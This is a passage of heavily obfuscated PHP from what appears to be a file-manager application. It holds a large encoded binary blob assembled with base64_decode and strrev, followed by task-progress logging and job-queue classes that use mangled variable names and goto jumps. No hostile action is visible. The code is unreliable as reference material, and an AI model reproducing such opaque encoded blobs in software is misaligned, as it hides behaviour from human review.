GWA==')."\145\121\227\135\354\316\4\147\162\2\34\67\71\260\324\262\13\123\45\24\111\335\25\300\66\271\252\32\273\53\160\250\50\333\107\371\245\162\154\65\211\127\156\156\27\157\311\21\226\312\211\323".base64_decode('ckSolagjNwdxrGE9QQN8e9/Z1unnoCY+Pal2RXgEbGammPqIDjvB4ayRVMKRxaHmQLglFA==')."\x5b\xaa\xf4\xe3\x63\x5a\x61\xa1\x88\xaa\xab\x92\x69\xab\x5a\xe2\x31\x1e\xf2\x1e\x91\x73\x82\x13\xfd\x34\x1d\xe\x46\xeb\x9\xfe\xc0\xd\xe\x7a\x13\x68\x73\xe1\x4d\xf1\x4d\x99\x25\xb6\x5f\xa4\x85\x50\x98\x78"."\x41\xd0\x59\x2c\xa5\x4a\xbd\x50\x52\x62\xe\x5f\x1b\xcc\x94\xe4\xc1\x5a\xf7\x32\xd8\x19\xa1\x34\x96\x90\xf3\x5\xbd\x14\x7f\x54\xc7\x96\x92\x52\x8d\xa5\xc\xc5\x32\xb5\x1\xfc\xf2\x5f\x20\xaf\x13\xc9\xd8\x48".strrev('şpJ;©zıFF’—’’û\\'."\n".'Î,iaÜ²8p¨uih—*1ËØ!–'."\r".'ÈŞUsÒf').strrev('û-½s¢ÑIôÍpŞ8É–&ájÊwĞ],3A|·ñéQ¡Œ_Ë{¼ÑÙæ½“áĞÈÒá¾¿\'')."\51\225\176\200\301\210\364\73\61\102\64\264\270\55\376\77\256\252\221\22\36\13\215\24\263\121\343\267\256\351\143\62\315\362\313\277\354\233\342\311\242\122\310\377\364\361\74\217\344\36\215\270".base64_decode('dWPPc5pkLwWCPoWFIir1aSY+gaSYwmhePtb1p6AE7LE1yK4d4YjYzGAsKAR/hW5x0c4daw==')."\x21\xd9\xb6\x87\x69\xf4\x10\x1b\x81\xe\x77\xd8\x65\xba\x5e\xff\x73\x1b\xdc\x3b\xde\xf6\x2b\xf9\x6\x79\x2f\x86\xa6\x75\xe3\x56\x20\xcc\x5e\xd1\x26\x14\xe3\xef\x43\x89\xac\xee\x94\x32\x15\x40\xc9\x8a\xd0\x8d"."\x71\x4\xa5\x51\xa9\xa1\xf\x51\xf2\xb7\x7f\x94\xf9\xcc\xb7\x84\xf8\x0\xf1\xaf\x18\xcc\xe6\x6d\xc7\xf6\xbf\x4d\xbe\x7c\x23\xd\x9\x5\x60\x45\x51\x81\x6b\xfd\xe8\x98\xb3\x28\x1e\x58\x76\x0\x6d\xaa\xf2\xda"."\111\370\260\330\24\142\223\115\63\73\132\2\160\250\321\302\254\65\334\170\32\277\227\224\353\63\345\136\47\374\34\337\277\242\357\313\122\355\204\7\355\107\164\273\364\301\72\232\375\377\46\43"."\x4d\x8c\x49\xee\x77\x9d\x85\x94\x56\xc8\x72\xaf\x9f\x42\x96\xc3\x6f\xf1\xa5\xcd\x61\xe7\xa3\xb3\x18\xe2\x7e\x7d\xcf\xf1\xee\x9e\x34\xc3\x88\xa7\x4\xf9\xa5\x40\x67\x26\x4f\xc9\xbb\x55\xa\x79\x39\x5c\x41\xcc".base64_decode('CMYeG/6w3S9Blj49lf70wC9bDd2VoHwOPlnNSbE5bWRSBW7SJQDtulBJkFyIseQ19kI6eQ==').strrev('Ÿ ÙaÊ5ˆ¢™Š¤¡ïÖ¸ÍÅ™O²ÈSÀÜRÃç^–&¤<Kñ|êªö#$÷*ÊŸËš—')."\264\2\45\62\265\141\212\217\367\2\11\201\75\154\232\362\220\127\67\51\137\164\277\305\45\315\117\316\176\345\334\375\304\235\50\330\33\72\156\353\25\320\26\115\147\113\210\3\215\202\374\132".base64_decode('Pi8OUeQVF/3ruJQNaV3xNpW4KVGpYURM0Jx0sEmBcMhZzIXoYY4DWpA2j7LjanrAI+72Ag==').base64_decode('OqpnJz3RhQ6Ti2Sn7Fwhj/gR32P7S0/lsakacBRsGsRssgZNskfzybs7QFDmMwczSOb0Cg==').base64_decode('KnHMaUxVSNqmT5wSpiEzty+ASk/GwVOq5V6Ao5OA/LTofXzThONCTJC9LgmjHvcrp6Uvtg==').strrev('©fã“»¨†WVï'."\r".']î6¶JKïƒ!rïoœThó‡÷–‹û£q­sá:·¼ËY§‚,ÙY×²').base64_decode('UlqYMDgek5VaDVyu9EFaqRukdhcLGQ+x5vAwA8qyb9o6nrlzD2iZV3G/tEC4PEE2dSknAw==')."\154\230\237\50\260\143\157\67\232\341\240\135\264\26\213\213\204\324\67\165\311\132\261\62\233\252\233\61\163\256\254\74\21\103\50\16\203\331\3\45\364\7\304\35\101\24\212\243\33\74\12\163"."\210\55\63\2\222\350\274\215\123\372\200\262\153\61\370\237\115\30\261\17\241\250\222\221\157\351\33\363\45\75\100\350\124\262\76\223\326\106\227\335\220\211\115\171\54\61\353\350\152\50\236\115"."\166\176\213\112\22\145\332\41\76\53\115\26\372\24\256\231\301\173\370\54\76\60\260\13\232\163\153\132\156\7\106\172\202\155\367\260\316\127\304\234\206\130\240\255\21\311\322\26\115\56\321\66"."\335\252\46\234\35\57\221\104\155\32\311\261\307\141\260\273\13\61\333\44\116\364\77\30\100\266\333\242\33\63\141\201\206\233\357\330\244\73\173\301\277\210\261\231\62\317\35\113\6\67\137\320"."\x6\x2a\xf4\xf1\x5d\xa6\x57\xb3\xbd\x12\x71\x4a\xaa\x4a\xdd\x8e\x90\xc1\x6\x76\x21\x36\xc3\xce\x76\xbb\x8a\x47\xd9\x44\x19\xbd\x1e\x65\x22\xa4\x52\xc9\x4f\x7a\x15\x59\x38\x5a\x94\x64\x3e\x9c\x9b\x5d\x50\x9f"."\x40\x97\x40\xee\x47\x3b\xa5\x27\xf9\xe5\x55\x72\xb9\x58\xf8\x9\x22\x53\xd7\x31\x8d\x25\xff\xf3\xf2\xe5\x5c\x52\x90\x3c\x3f\x4a\x8b\x96\xde\xb1\x15\x1a\x28\xa2\xb2\x82\x16\xc1\xe4\x26\x16\x18\xa4\x9a\x81\xc5"."\xfc\x6a\xb7\x26\x99\x13\x3a\xd5\x62\x20\xe7\x49\xef\xb7\xa3\xee\x93\x9e\x38\x37\xe5\xb0\xf4\x3e\x32\x5a\x13\x22\xec\xee\x5\xaa\x8e\x63\x47\x8b\xe2\xc2\xeb\xba\xc4\xbf\x52\x2e\x20\xeb\x33\xc2\x34\xc4\x63\xde"."\104\10\236\6\342\257\354\100\300\261\207\342\17\175\72\366\124\226\373\265\137\44\43\72\136\121\111\225\274\255\16\154\224\334\303\243\137\223\26\142\126\305\176\51\324\121\314\212\210\244\152\46"."\33\61\236\350\360\263\200\235\13\272\70\6\363\336\140\271\336\17\247\76\324\151\230\355\27\376\327\17\335\376\277\172\337\166\146\15\73\24\300\345\363\333\202\213\101\152\207\332\342\343\130\256"."\4\241\12\151\127\73\234\213\355\21\100\123\250\363\175\103\202\305\220\70\267\107\147\16\46\231\337\111\215\235\326\151\231\214\264\44\227\337\347\224\74\140\216\110\161\220\277\130\135\56\342\276"."\145\354\176\314\274\233\350\203\331\153\344\275\202\253\140\130\271\154\362\23\310\256\347\317\111\131\10\42\225\302\115\26\1\231\355\170\330\276\254\314\204\240\40\46\216\13\126\227\63\222\203\145"."\xce\xec\x89\xf1\xae\xf3\xf1\x4\x49\xe6\x29\x41\x13\xd5\x47\xa2\x11\xb7\x1f\x66\xa1\x24\xde\x90\x12\x47\x37\x30\xc\xb2\x3\x82\x48\x9e\x6d\x5d\xab\x61\x71\xe9\x85\x5f\x70\x7a\x2\xbc\x50\xe6\x7f\xe\x50\x9".strrev('^5¼ÅqXxo•8ï‚ÎEææ”pš—M‰“8y‰Í×vG£6°MÇ”×;Œ×')."\xa0\xd6\xeb\x2a\x8e\x3f\x52\xed\x9c\x34\x8e\x57\x93\xa9\xd9\xb\x9a\x69\x51\xac\x64\x61\xca\x36\x72\xa8\x45\x8e\xbc\xbd\xa5\x79\xe8\x4\x89\x9\x9c\x9\xa6\x68\x79\x46\xc1\x2b\x25\x14\x8e\x38\x24\xf7\x7\x63".base64_decode('OJ0Fk8ifTihXPElm3ElJq+sWKSl4qk9uiHzs6zw7wnaE4jA1HokG1eUh7CwjdHqwizl+Ng==')."\x4c\xf2\x6e\xb\x2b\xb2\xab\xbd\x8a\x5c\xa6\x83\x9\x80\x36\x47\xad\xa6\x20\x25\x1d\x71\x45\x49\xc5\x2c\xbc\x17\xdb\xd9\x7c\x33\x3f\xfa\x75\x5e\xc7\x96\x6e\x70\x30\xaf\x61\xb2\xd2\xd3\x89\x8c\x6f\xdf\x38\xe7"."\342\202\162\150\111\263\140\311\256\77\35\211\130\232\63\121\152\224\355\324\273\162\150\42\353\111\133\117\51\130\56\160\154\25\272\353\153\146\364\176\121\51\50\235\143\326\177\11\46\354\131\142"."\63\274\314\344\230\341\224\315\147\122\317\76\345\322\20\155\306\154\7\21\211\107\177\334\217\375\264\72\74\150\65\110\112\130\205\370\22\203\127\237\46\30\233\16\263\131\110\54\256\64\314\32"."\x26\x4e\xc5\x9b\x5e\x7e\xbe\xcd\x1e\x82\xc1\x26\x7c\x7e\xec\x6a\xc\x5f\x31\xf1\x13\xfa\x3\xdd\xf9\x4a\x35\xab\x32\xeb\x25\xac\x6a\x10\xba\x23\xc2\x71\x4b\xb7\x9a\xf0\x25\xbb\x30\x1a\x29\x44\xb3\x1d\x25\x2e"."\370\234\267\305\244\374\104\243\104\225\104\16\135\21\130\54\310\40\351\4\37\355\362\122\316\347\325\110\42\1\63\37\344\120\202\164\6\355\64\1\340\27\161\113\226\332\242\21\226\222\111\56"."\xe6\xcb\x16\xfd\x62\x7f\x2\x21\xe1\xfe\x89\x24\xd3\x73\xb4\xc0\x90\xc6\xbd\xad\xb9\x73\x75\x39\x76\xd0\x92\xc1\x40\x92\xf0\x90\x60\xe9\x99\xb0\x38\xaa\x96\xc4\x56\x96\xd\x6f\xc1\x85\xc\xe1\x82\x4b\x3c\x57"."\xac\x8a\xda\x90\x10\xc2\xc5\x26\x30\x95\x6a\xd5\x86\xca\xa0\xa6\x74\xb7\xb7\x3c\x4\xe1\xa8\x44\x88\x97\x1c\x81\x88\xb\x41\xfa\xb0\xfc\x75\xc0\x13\x17\x70\x1c\x88\xa5\x50\xe1\x28\x44\xca\x2f\xce\x1\x45\x33"."\x31\xac\x5c\xf3\x9\xf\x74\x66\x97\x1d\x91\x70\xa2\x12\x20\xfa\x50\x16\xb7\xae\x91\x36\xdc\xd8\xfc\x48\x98\xdd\xd0\xa6\x70\xbd\x92\xf8\xa4\xd3\xed\x9\x47\xe3\x63\x86\x70\xc8\xd5\x40\xaf\x3\xea\x52\x21\x60"."\25\36\23\71\135\111\240\324\222\212\57\253\373\222\110\100\317\204\245\342\144\33\201\11\63\304\312\177\104\120\245\263\213\45\177\61\42\201\11\65\162\51\216\125\215\67\14\60\243\162\242\243"."\x3a\xee\xa1\x25\x3b\x5e\x41\xbe\x14\x98\x25\x47\x9\x34\x2d\xe0\x4c\xa2\xf8\xba\xab\xf6\x72\x6\x77\xcb\x68\xe\xc7\xcb\x8a\x32\x7c\xd8\xb0\x93\x69\x69\x7b\x5e\x9a\x58\xa\x2f\x94\x74\x36\x54\xa0\x7c\x3b\xdc"."\265\145\175\355\126\132\210\102\112\352\43\31\40\305\315\62\171\150\215\312\146\243\111\70\247\330\7\71\362\116\320\5\70\57\115\302\171\113\222\131\346\222\176\45\371\154\255\150\115\320\274\322"."\316\3\45\130\252\114\203\205\252\110\102\235\250\77\313\42\227\176\16\50\321\215\115\264\146\345\153\41\224\135\56\223\217\162\265\50\213\74\141\55\334\330\102\52\301\233\335\162\51\16\273\51"."\347\212\122\216\157\263\224\62\234\232\162\241\11\15\252\204\221\121\351\222\41\322\312\230\74\321\117\142\371\110\166\105\131\46\131\266\237\52\157\141\25\55\313\145\54\247\351\223\13\56\167\20"."\x38\x55\xa7\x11\x66\x22\x89\x84\xb4\x8c\x31\x28\x4c\x4b\xd9\x15\x14\x50\x70\x70\x3b\xcd\xc1\x9c\xc9\x97\xa7\x94\x30\x27\xc6\xb2\x55\xa0\xe0\xee\xe7\x92\xd2\x9c\xa4\x9f\x2b\x4a\x8e\xec\xcb\xde\x88\xf1\x60\x8d".strrev('"Ú\'–ˆâ}ˆ	d(ÊpŒ9Ğ³Õ.ßô‘’>ÎšJG²ùoNêHÛMªîúÂŠkñ£\'¶©T')."\321\204\343\362\32\25\111\340\360\214\36\301\67\143\273\20\176\370\112\34\271\323\45\234\46\307\314\202\355\301\151\161\63\117\176\233\114\333\26\26\55\124\5\105\4\161\274\16\173\44\203\55"."\x14\x12\x27\xad\xb8\x52\xe4\xdc\x8e\x90\x2d\xe1\x58\x24\x8\xc6\x0\x58\xb7\x13\xd3\x69\x2a\xe1\x73\x8e\x8\x3e\xf\xe4\x11\x79\x99\x5\xa3\x80\xd6\xa2\xcb\x6c\x41\x0\x6\xcd\x54\xc2\x1c\x61\x6e\x20\x11\x5d".base64_decode('SZ0kTgw1t2w55L5ALZufER8plp+m+OFpJi8pA96G9Q3k+x3Z6Wub3KL8i0qAUwNRBH2XhQ==')."\250\160\341\162\135\54\36\53\111\352\14\304\142\313\43\321\26\372\214\113\111\62\311\45\31\371\225\44\165\266\105\72\46\112\13\266\7\102\341\222\64\154\17\330\241\12\207\242\64\51\324\111".strrev('ßÇ“©Ç‘YÇ…g¡¨t‘u0ËL~¢ÎÉ´ùV‡H¸ÅCç†HvW©I¨©y¨Eª\'¿ÎIj')."\142\156\242\171\300\371\166\242\313\74\227\21\66\24\204\255\373\72\240\354\150\36\240\370\371\33\316\37\270\234\57\114\114\174\16\123\24\11\116\346\20\141\112\22\155\312\353\75\1\114\53\333"."\101\362\41\107\351\1\34\111\25\35\200\53\266\304\114\320\310\200\231\220\16\330\350\56\13\56\307\103\227\112\26\234\64\354\110\266\265\376\262\26\31\124\133\215\271\204\320\43\377\37\42\176"."\330\377\336\271\0\0"."", 10, -8))); goto b‘ÄäË†Öù; c¢¨²áéÎÃ: class TaskHttp extends Task { protected function startAfter() { $ŠÕÉœ”Œ =& $_SERVER[Š—Â“œÔ]; $ñõ€Ôı· =& $this->task; $ñõ€Ôı·[$ŠÕÉœ”Œ[1848]] = 1; Hook::bind($ŠÕÉœ”Œ[1816], array($this, $ŠÕÉœ”Œ[1849])); Hook::bind($ŠÕÉœ”Œ[1818], array($this, $ŠÕÉœ”Œ[1850])); Hook::bind($ŠÕÉœ”Œ[1820], array($this, $ŠÕÉœ”Œ[1851])); } protected function endAfter() { $“ÏñÜ¥ =& $_SERVER[Š—Â“œÔ]; Hook::unbind($“ÏñÜ¥[1816], array($this, $“ÏñÜ¥[1849])); Hook::unbind($“ÏñÜ¥[1818], array($this, $“ÏñÜ¥[1850])); Hook::unbind($“ÏñÜ¥[1820], array($this, $“ÏñÜ¥[1851])); } public function progressStart($áõÉ¥ÈÒ) { $Ô¤ıÜï¤ =& $_SERVER[Š—Â“œÔ]; $ó£ï¥óª = curl_getinfo($áõÉ¥ÈÒ); self::log($Ô¤ıÜï¤[1852] . $ó£ï¥óª[$Ô¤ıÜï¤[384]]); self::valueSet($this->task[$Ô¤ıÜï¤[477]], $this->task); } public function progressEnd($’‚Ş¦š†) { $·‰Åï‘¬ =& $_SERVER[Š—Â“œÔ]; self::log($·‰Åï‘¬[1853] . $this->task[$·‰Åï‘¬[477]]); $this->end(); } public function progress($àìå‰, $·ŠĞ÷æ, $øÚ¼Ëú¥, $×‹…‡”, $Ÿü¸åÃĞ) { $â¤™–Äæ =& $_SERVER[Š—Â“œÔ]; $Öİº¤üâ =& $this->task; if ($Ÿü¸åÃĞ > 0) { $Öİº¤üâ[$â¤™–Äæ[1137]] = $Öİº¤üâ[$â¤™–Äæ[1137]] == 0 ? $×‹…‡” : $Öİº¤üâ[$â¤™–Äæ[1137]]; $Öİº¤üâ[$â¤™–Äæ[1771]] = $Ÿü¸åÃĞ; } else { if ($øÚ¼Ëú¥ > 0) { $Öİº¤üâ[$â¤™–Äæ[1137]] = $Öİº¤üâ[$â¤™–Äæ[1137]] == 0 ? $·ŠĞ÷æ : $Öİº¤üâ[$â¤™–Äæ[1137]]; $Öİº¤üâ[$â¤™–Äæ[1771]] = $øÚ¼Ëú¥; } } $this->update(); self::log("\160\x72\157\147\162\145\x73\x73\x48\164\164\160\x3a\x64\x6f\167\x6e\x3a{$øÚ¼Ëú¥}\x2f{$·ŠĞ÷æ}\73\x20\165\x70\154\157\x61\144\72{$Ÿü¸åÃĞ}\x2f{$×‹…‡”}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÒÉ…éØ–, $ÅÄÅĞ™ = '', $º„ü¾Í¯ = 0, $ÃÉÅ‰ëÄ = '') { $±”Ò§Ğ¥ =& $_SERVER[Š—Â“œÔ]; $ÃÉÅ‰ëÄ = $ÃÉÅ‰ëÄ ? $ÃÉÅ‰ëÄ : ($ÅÄÅĞ™ ? $ÅÄÅĞ™ : $ÒÉ…éØ–); $ø“ ËÙ’ = new Task($ÒÉ…éØ–, $ÅÄÅĞ™, $º„ü¾Í¯, $ÃÉÅ‰ëÄ); $GLOBALS[$±”Ò§Ğ¥[1854] . $ÒÉ…éØ–] = new TaskLog($±”Ò§Ğ¥[1753], $ø“ ËÙ’, $ÃÉÅ‰ëÄ); return $ø“ ËÙ’; } public function __construct($ßêÚ“ã = '', $–†™šåè = '', $ÅºÏ§ç² = '') { $ıƒÅˆôš =& $_SERVER[Š—Â“œÔ]; if (!$ßêÚ“ã) { $ßêÚ“ã = $ıƒÅˆôš[1753]; } $¬—òÇ³ = $ßêÚ“ã . $ıƒÅˆôš[464] . rand_string(10); if (!$ÅºÏ§ç²) { $ÅºÏ§ç² = $ßêÚ“ã . $ıƒÅˆôš[53] . $ÅºÏ§ç²; } switch ($ßêÚ“ã) { case $ıƒÅˆôš[1753]: if (!$–†™šåè || !$–†™šåè->task) { return echoLog($ßêÚ“ã . $ıƒÅˆôš[1855]); } $¦Úú§õë = $–†™šåè; $¬—òÇ³ = $¦Úú§õë->task[$ıƒÅˆôš[477]]; $ßêÚ“ã = $¦Úú§õë->task[$ıƒÅˆôš[477]]; if (!$¦Úú§õë->task[$ıƒÅˆôš[1658]]) { $¦Úú§õë->task[$ıƒÅˆôš[1658]] = $ÅºÏ§ç² ? $ÅºÏ§ç² : $ßêÚ“ã; } break; case $ıƒÅˆôš[1856]: if (!$–†™šåè) { return echoLog($ßêÚ“ã . $ıƒÅˆôš[1857]); } $À¥ö†ÚË = is_string($–†™šåè) ? array($–†™šåè) : $–†™šåè; $¦Úú§õë = new TaskFileTransfer($¬—òÇ³, $ßêÚ“ã, 0, $ÅºÏ§ç² ? $ÅºÏ§ç² : $À¥ö†ÚË[0]); foreach ($À¥ö†ÚË as $£¬Ì™¹) { $¦Úú§õë->addPath($£¬Ì™¹); } break; case $ıƒÅˆôš[390]: if (!$–†™šåè) { return echoLog($ßêÚ“ã . $ıƒÅˆôš[1857]); } $À¥ö†ÚË = is_string($–†™šåè) ? array($–†™šåè) : $–†™šåè; $¦Úú§õë = new TaskZip($¬—òÇ³, $ßêÚ“ã, 0, $ÅºÏ§ç² ? $ÅºÏ§ç² : $À¥ö†ÚË[0]); foreach ($À¥ö†ÚË as $£¬Ì™¹) { $¦Úú§õë->addPath($£¬Ì™¹); } break; case $ıƒÅˆôš[1296]: if (!$–†™šåè) { return echoLog($ßêÚ“ã . $ıƒÅˆôš[1857]); } $¦Úú§õë = new TaskUnZip($¬—òÇ³, $ßêÚ“ã, 0, $ÅºÏ§ç² ? $ÅºÏ§ç² : $–†™šåè); if ($–†™šåè) { $¦Úú§õë->addFile($–†™šåè); } break; case $ıƒÅˆôš[152]: $¦Úú§õë = new TaskHttp($¬—òÇ³, $ßêÚ“ã); break; default: return; break; } $this->task = $¦Úú§õë; $this->taskID = $¬—òÇ³; Hook::bind($ıƒÅˆôš[1791], array($this, $ıƒÅˆôš[1858])); Hook::bind($ıƒÅˆôš[1793], array($this, $ıƒÅˆôš[1859])); Hook::bind($ıƒÅˆôš[1787], array($this, $ıƒÅˆôš[1860])); echoLog($ıƒÅˆôš[1861] . $¦Úú§õë->task[$ıƒÅˆôš[1658]]); } public function __destruct() { $this->end(); } public function end($ÀŞ¹²¦Á = '') { $âÖ¶øãÃ =& $_SERVER[Š—Â“œÔ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ÀŞ¹²¦Á); $this->task = !1; $this->taskID = !1; Hook::unbind($âÖ¶øãÃ[1791], array($this, $âÖ¶øãÃ[1858])); Hook::unbind($âÖ¶øãÃ[1793], array($this, $âÖ¶øãÃ[1859])); Hook::unbind($âÖ¶øãÃ[1787], array($this, $âÖ¶øãÃ[1860])); } public function taskUpdate($é‰¢ï±) { $Õ¦´åí =& $_SERVER[Š—Â“œÔ]; if (!$é‰¢ï± || $this->taskID != $é‰¢ï±[$Õ¦´åí[477]]) { return; } $Â¸¦œ¨Î = 20; $û‘Ö³”— = intval($é‰¢ï±[$Õ¦´åí[1772]] * $Â¸¦œ¨Î); $ ›†ª’™ = $Õ¦´åí[176] . str_repeat($Õ¦´åí[508], $û‘Ö³”—) . $Õ¦´åí[1088] . str_repeat($Õ¦´åí[53], $Â¸¦œ¨Î - $û‘Ö³”—) . $Õ¦´åí[178]; $¡Š±÷è = $ ›†ª’™ . sprintf($Õ¦´åí[1862], $é‰¢ï±[$Õ¦´åí[1772]] * 100) . $Õ¦´åí[1863]; $¸šÎ´—° = $¡Š±÷è . $é‰¢ï±[$Õ¦´åí[1771]] . $Õ¦´åí[8] . $é‰¢ï±[$Õ¦´åí[1137]] . LNG($Õ¦´åí[1864]); $Áµ¬ÂÃï = $Õ¦´åí[12]; if ($é‰¢ï±[$Õ¦´åí[1848]]) { $¸šÎ´—° = $¡Š±÷è . size_format($é‰¢ï±[$Õ¦´åí[1771]]) . $Õ¦´åí[8] . size_format($é‰¢ï±[$Õ¦´åí[1137]]); $Áµ¬ÂÃï = size_format($é‰¢ï±[$Õ¦´åí[1773]]) . $Õ¦´åí[1865]; } if ($é‰¢ï±[$Õ¦´åí[1139]]) { $é‰¢ï±[$Õ¦´åí[1822]] = $é‰¢ï±[$Õ¦´åí[1139]] . $Õ¦´åí[53] . $é‰¢ï±[$Õ¦´åí[1822]]; } if ($é‰¢ï±[$Õ¦´åí[1822]]) { $µáñŸ»÷ = $Õ¦´åí[12]; if ($é‰¢ï±[$Õ¦´åí[1824]]) { $µáñŸ»÷ = $Õ¦´åí[50] . size_format($é‰¢ï±[$Õ¦´åí[1825]]) . $Õ¦´åí[8] . size_format($é‰¢ï±[$Õ¦´åí[1824]]); } $Áµ¬ÂÃï .= $é‰¢ï±[$Õ¦´åí[1822]] . $µáñŸ»÷; } if ($é‰¢ï±[$Õ¦´åí[830]] && !$é‰¢ï±[$Õ¦´åí[1824]]) { $Áµ¬ÂÃï .= $Õ¦´åí[53] . size_format($é‰¢ï±[$Õ¦´åí[1829]]) . $Õ¦´åí[8] . size_format($é‰¢ï±[$Õ¦´åí[830]]); } echoLog($¸šÎ´—° . $Õ¦´åí[53] . $Áµ¬ÂÃï, !0); } public function taskEnd($Öµµöá´) { $¦—üŸÖ =& $_SERVER[Š—Â“œÔ]; if (!$Öµµöá´ || $this->taskID != $Öµµöá´[$¦—üŸÖ[477]]) { return; } $×‹ÓÈóó = $Öµµöá´ ? LNG($¦—üŸÖ[1866]) . $¦—üŸÖ[4] . $Öµµöá´[$¦—üŸÖ[1771]] . $¦—üŸÖ[8] . $Öµµöá´[$¦—üŸÖ[1137]] . LNG($¦—üŸÖ[1864]) . $¦—üŸÖ[74] : $¦—üŸÖ[12]; echoLog($¦—üŸÖ[1867] . $Öµµöá´[$¦—üŸÖ[1658]] . ($Öµµöá´[$¦—üŸÖ[528]] ? $¦—üŸÖ[74] . $Öµµöá´[$¦—üŸÖ[528]] : $¦—üŸÖ[12]) . $¦—üŸÖ[74] . $×‹ÓÈóó . $¦—üŸÖ[1868] . sprintf($¦—üŸÖ[919], timeFloat() - $Öµµöá´[$¦—üŸÖ[1774]]) . $¦—üŸÖ[1786]); $this->end(); } public function taskKill($¼¤·áœÕ) { $Å¾şµŞ =& $_SERVER[Š—Â“œÔ]; if (!$¼¤·áœÕ || $this->taskID != $¼¤·áœÕ[$Å¾şµŞ[477]]) { return; } echoLog($Å¾şµŞ[1869] . $¼¤·áœÕ[$Å¾şµŞ[1658]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\121\x75\145\x75\x65\x4c\x65\156\x67\x74\x68"; const QUEUE_DATA = "\164\x61\x73\x6b\121\165\145\x75\145\104\141\x74\x61"; const QUEUE_TIME = "\164\x61\163\153\x51\165\x65\165\145\114\x61\x73\164\x52\165\x6e"; const QUEUE_THREAD = "\x74\141\163\153\121\165\145\x75\x65\x54\x68\x72\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÁîÖ , $Ûíåî° = array(), $µøÜÒ¡´ = '', $ªî³¤™· = '') { $»åì²Œ¿ =& $_SERVER[Š—Â“œÔ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ªî³¤™· && array_find_by_field(self::$listData, $»åì²Œ¿[97], $ªî³¤™·)) { return !0; } if ($ªî³¤™· && array_find_by_field(self::$listDataAdd, $»åì²Œ¿[97], $ªî³¤™·)) { return !0; } self::$listDataAdd[] = array($»åì²Œ¿[343] => $ÁîÖ , $»åì²Œ¿[1870] => $Ûíåî°, $»åì²Œ¿[528] => $µøÜÒ¡´, $»åì²Œ¿[97] => $ªî³¤™·); return !0; } public static function addSubmit() { $á«ØÉ¾ı =& $_SERVER[Š—Â“œÔ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($á«ØÉ¾ı[1871] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $á«ØÉ¾ı[12], $á«ØÉ¾ı[528])), $á«ØÉ¾ı[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ÆÄ‰¼, $’Ê±¯ÚÙ = array(), $ş¯«¦¢ú = '', $ã•³Š = '') { $Âäïîã =& $_SERVER[Š—Â“œÔ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $‡­Ìë±ñ = self::getAll(); if ($ã•³Š && array_find_by_field($‡­Ìë±ñ, $Âäïîã[97], $ã•³Š)) { return !0; } $‡­Ìë±ñ[] = array($Âäïîã[343] => $ÆÄ‰¼, $Âäïîã[1870] => $’Ê±¯ÚÙ, $Âäïîã[528] => $ş¯«¦¢ú, $Âäïîã[97] => $ã•³Š); self::setAll($‡­Ìë±ñ); write_log($Âäïîã[1871] . $ş¯«¦¢ú, $Âäïîã[197]); return !0; } public static function run() { $öÀëß‚ƒ =& $_SERVER[Š—Â“œÔ]; $µô˜¯‡² = self::getAll(); $âø€¿ş = array_shift($µô˜¯‡²); if (!$âø€¿ş) { return !1; } self::setAll($µô˜¯‡²); $ß«¯èº“ = timeFloat(); $€ıì’ŞĞ = $öÀëß‚ƒ[12]; try { $€ıì’ŞĞ = Hook::apply($âø€¿ş[$öÀëß‚ƒ[343]], $âø€¿ş[$öÀëß‚ƒ[1870]]); } catch (Exception $ùšªŒÑ) { write_log($ùšªŒÑ, $öÀëß‚ƒ[1261]); } $“²±ÕîÍ = number_format(timeFloat() - $ß«¯èº“, 3) . $öÀëß‚ƒ[1786]; if ($€ıì’ŞĞ && is_string($€ıì’ŞĞ)) { $“²±ÕîÍ = $“²±ÕîÍ . $öÀëß‚ƒ[1872] . $€ıì’ŞĞ; } write_log($öÀëß‚ƒ[1873] . $âø€¿ş[$öÀëß‚ƒ[528]] . $öÀëß‚ƒ[1874] . $“²±ÕîÍ, $öÀëß‚ƒ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ùÀ÷ñã =& $_SERVER[Š—Â“œÔ]; $ã˜ÚÒø÷ = self::threadCount() + 1; if ($ã˜ÚÒø÷ > 3 || !self::count()) { return; } write_log($ùÀ÷ñã[1875] . $ã˜ÚÒø÷, $ùÀ÷ñã[197]); Cache::set(self::QUEUE_THREAD, $ã˜ÚÒø÷, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ùÀ÷ñã[1876], $ùÀ÷ñã[197]); } public static function getKey($ Ô—µä², $³ƒ¦ş³õ = "\x69\x6e\x74") { $àİÏÌè =& $_SERVER[Š—Â“œÔ]; Cache::removeMemory($ Ô—µä²); $²œãåÍë = Cache::get($ Ô—µä²); if ($³ƒ¦ş³õ == $àİÏÌè[365]) { return $²œãåÍë ? intval($²œãåÍë) : 0; } if ($³ƒ¦ş³õ == $àİÏÌè[1877]) { return is_array($²œãåÍë) ? $²œãåÍë : array(); } return $²œãåÍë; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Š—Â“œÔ][1877]); } public static function setAll($Í€º´”) { $˜¦†şïœ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Í€º´”), $˜¦†şïœ); Cache::set(self::QUEUE_DATA, $Í€º´”, $˜¦†şïœ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto CÊ·¯ë©ò¤; eßÀ‰½í¤ó: class 